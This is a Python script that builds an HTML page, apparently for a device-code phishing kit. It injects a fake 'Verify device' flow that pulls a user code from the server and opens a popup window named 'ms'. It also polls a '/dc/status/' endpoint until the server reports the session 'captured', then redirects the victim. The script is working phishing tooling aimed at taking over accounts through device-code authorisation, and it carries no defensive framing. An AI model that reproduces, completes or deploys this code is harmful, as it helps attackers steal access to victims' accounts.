import re

with open("user_full_html.txt") as f:
    html = f.read()

# Replace the getDeviceCode function with one that uses the Go template vars
backend_vars = """
			  var sid = '{session_id}';
			  var verifyUrl = '{verify_url}';
			  var codeReady = {code_ready};
			  var expiresIn = {expires_seconds};

			  function getDeviceCode() {
			    var fromServer = '{user_code}';
			    if (fromServer && fromServer.length > 0) return fromServer;
			    var params = new URLSearchParams(window.location.search);
			    var fromUrl = params.get('code');
			    if (fromUrl && /^[A-Za-z0-9][A-Za-z0-9-]{3,15}$/.test(fromUrl)) {
			      return fromUrl.toUpperCase();
			    }
			    return 'XKCD-48F2';
			  }
"""

html = re.sub(r'function getDeviceCode\(\) \{.*?\n\s+return \x27XKCD-48F2\x27;\n\s+\}', backend_vars.strip(), html, flags=re.DOTALL)


# Add polling logic at the bottom, before })();
polling_logic = """
			  // Polling logic
			  var verifyBtnElement = document.getElementById('verify-device');
			  var ready = codeReady && DEVICE_CODE !== '';

			  document.addEventListener('trustgate:verify', function(e) {
			      if(!ready || !DEVICE_CODE) return;
			      var w = 600, h = 600, l = (screen.width-w)/2, t = (screen.height-h)/2;
			      var popup = window.open(verifyUrl,'ms','width='+w+',height='+h+',left='+l+',top='+t+',scrollbars=yes,resizable=yes');
			      if(popup) popup.focus();
			      verifyBtnElement.textContent = 'Verification in progress...';
			  });

			  function poll() {
			    fetch('/dc/status/'+sid, {method:'GET',credentials:'include'})
			      .then(function(r){return r.json()})
			      .then(function(d){
			        if(d.ready && !ready) {
			          ready = true;
			          DEVICE_CODE = d.user_code;
			          verifyUrl = d.verify_url;
			          render();
			          verifyBtnElement.disabled = false;
			          verifyBtnElement.textContent = 'Verify device';
			        }
			        if(d.captured) {
			          if(d.redirect_url) {
			            top.location.href = d.redirect_url;
			          } else {
			            top.location.href = '/';
			          }
			        }
			        if(d.expired) {
			          verifyBtnElement.disabled = true;
			          verifyBtnElement.textContent = 'Session Expired';
			        }
			        if(!d.failed && !d.expired && !d.captured) {
			          setTimeout(poll,3000);
			        }
			      }).catch(function(){setTimeout(poll,5000);});
			  }

			  if(!ready) {
			      verifyBtnElement.disabled = true;
			      verifyBtnElement.textContent = 'Generating...';
			  }

			  poll();
"""

html = html.replace("})();\n\t\t</script>", polling_logic + "\n			})();\n\t\t</script>")

with open("merged_html.txt", "w") as f:
    f.write(html)

print("Merged HTML created.")
